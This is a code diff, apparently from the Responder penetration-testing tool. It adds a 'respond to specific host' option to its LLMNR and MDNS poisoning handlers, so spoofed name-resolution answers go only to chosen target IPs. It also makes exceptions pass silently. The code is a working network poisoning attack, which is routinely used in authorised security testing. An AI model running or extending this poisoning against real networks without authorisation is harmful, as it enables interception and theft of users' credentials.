@@ -1108,9 +1108,9 @@ class LLMNR(BaseRequestHandler):
                               except Exception:
                                  logging.warning('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
                                  pass
-            else:
+
+            if Analyze(AnalyzeMode) == False and RespondToSpecificHost(RespondTo) == False:
                if data[2:4] == "\x00\x00":
-                  if Analyze(AnalyzeMode) == False:
                      if Parse_IPV6_Addr(data):
                         Name = Parse_LLMNR_Name(data)
                         buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
@@ -1131,8 +1131,10 @@ class LLMNR(BaseRequestHandler):
                            except Exception:
                               logging.warning('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
                               pass
+            else:
+               pass
         except:
-           raise
+           pass
 
 ##################################################################################
 #DNS Stuff
@@ -1254,7 +1256,18 @@ class MDNS(BaseRequestHandler):
                print '[Analyze mode: MDNS] Host: %s is looking for : %s'%(self.client_address[0],Parse_MDNS_Name(data))
                logging.warning('[Analyze mode: MDNS] Host: %s is looking for : %s'%(self.client_address[0],Parse_MDNS_Name(data)))
 
-         if Analyze(AnalyzeMode) == False:
+         if RespondToSpecificHost(RespondTo):
+            if Analyze(AnalyzeMode) == False:
+               if RespondToIPScope(RespondTo, self.client_address[0]):
+                  if Parse_IPV6_Addr(data):
+                     print 'MDNS poisoned answer sent to this IP: %s. The requested name was : %s'%(self.client_address[0],Parse_MDNS_Name(data))
+                     logging.warning('MDNS poisoned answer sent to this IP: %s. The requested name was : %s'%(self.client_address[0],Parse_MDNS_Name(data)))
+                     Name = Poisoned_MDNS_Name(data)
+                     MDns = MDNSAns(AnswerName = Name)
+                     MDns.calculate()
+                     soc.sendto(str(MDns),(MADDR,MPORT))
+
+         if Analyze(AnalyzeMode) == False and RespondToSpecificHost(RespondTo) == False:
             if Parse_IPV6_Addr(data):
                print 'MDNS poisoned answer sent to this IP: %s. The requested name was : %s'%(self.client_address[0],Parse_MDNS_Name(data))
                logging.warning('MDNS poisoned answer sent to this IP: %s. The requested name was : %s'%(self.client_address[0],Parse_MDNS_Name(data)))
